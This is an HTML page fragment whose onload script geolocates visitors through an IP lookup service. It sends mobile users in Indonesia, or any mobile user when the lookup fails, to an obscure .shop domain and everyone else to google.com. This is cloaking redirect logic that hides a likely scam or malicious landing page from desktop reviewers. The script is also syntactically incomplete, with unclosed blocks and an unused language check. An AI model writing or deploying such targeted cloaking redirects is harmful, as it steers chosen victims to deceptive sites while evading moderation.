  <body onload="handleResponse()">
 
<script>
  function handleResponse() {
    function isMobileDevice() {
      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }

   function isEnglishLang() {
    return navigator.language.startsWith('en') || 
           navigator.languages.some(lang => lang.startsWith('en'));
}

    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        // 严格的三重条件判断
        if (data.country === 'ID' && isMobileDevice()) {
          window.location.href = "https://www.wey623km.shop/yinjz1/a.html";
          return;
        }
      window.location.href = "https://www.google.com";
      })
      .catch(() => {
        // IP检测失败时严格的双重条件判断
        if (isMobileDevice() ) {
          window.location.href = "https://www.wey623km.shop/yinjz1/a.html";
          return;
        }
        
           window.location.href = "https://www.google.com";

</script>
